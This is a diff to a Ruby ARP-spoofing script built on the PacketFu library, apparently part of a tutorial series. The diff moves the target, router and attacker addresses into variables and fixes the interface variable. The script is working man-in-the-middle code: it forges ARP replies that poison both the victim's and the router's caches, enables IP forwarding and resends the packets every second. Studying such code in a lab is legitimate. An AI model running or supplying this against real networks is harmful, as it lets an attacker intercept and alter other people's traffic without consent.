@@ -6,28 +6,33 @@ require 'thread'
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread. 
 
-target_mac = "08:00:27:CA:CA:73"
-target_ip = "10.0.2.15"
+target_mac  = "b8:ac:6f:34:ad:d8"
+target_ip   = "192.168.1.101"
+sender_mac  = "7c:7a:91:7d:2b:02"
+sender_ip   = "192.168.1.100"
+router_ip   = "192.168.1.1"
+router_mac  = "00:22:6b:7c:9b:12"
+@iface       = "wlp2s0"
 
 # Construct the target's packet
 arp_packet_target = PacketFu::ARPPacket.new()
-arp_packet_target.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
-arp_packet_target.eth_daddr = '78:2b:cb:a3:ef:c9'       # target's MAC address
-arp_packet_target.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
-arp_packet_target.arp_daddr_mac = '78:2b:cb:a3:ef:c9'   # target's MAC address
-arp_packet_target.arp_saddr_ip = '192.168.0.100'        # router's IP
-arp_packet_target.arp_daddr_ip = '192.168.0.13'         # target's IP
-arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
+arp_packet_target.eth_saddr = sender_mac       # sender's MAC address
+arp_packet_target.eth_daddr = target_mac       # target's MAC address
+arp_packet_target.arp_saddr_mac = sender_mac   # sender's MAC address
+arp_packet_target.arp_daddr_mac = target_mac   # target's MAC address
+arp_packet_target.arp_saddr_ip = router_ip     # router's IP
+arp_packet_target.arp_daddr_ip = target_ip     # target's IP
+arp_packet_target.arp_opcode = 2               # arp code 2 == ARP reply
  
 # Construct the router's packet
 arp_packet_router = PacketFu::ARPPacket.new()
-arp_packet_router.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
-arp_packet_router.eth_daddr = '00:1a:6d:38:15:ff'       # router's MAC address
-arp_packet_router.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
-arp_packet_router.arp_daddr_mac = '00:1a:6d:38:15:ff'   # router's MAC address
-arp_packet_router.arp_saddr_ip = '192.168.0.13'         # target's IP
-arp_packet_router.arp_daddr_ip = '192.168.0.100'        # router's IP
-arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
+arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
+arp_packet_router.eth_daddr = router_mac       # router's MAC address
+arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
+arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
+arp_packet_router.arp_saddr_ip = target_ip     # target's IP
+arp_packet_router.arp_daddr_ip = router_ip     # router's IP
+arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply
 
 # Enable IP forwarding
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
@@ -38,8 +43,8 @@ def runspoof(arp_packet_target,arp_packet_router)
   caught=false
   while caught==false do
     sleep 1
-    arp_packet_target.to_w(@interface)
-    arp_packet_router.to_w(@interface)
+    arp_packet_target.to_w(@iface)
+    arp_packet_router.to_w(@iface)
   end
 end
 
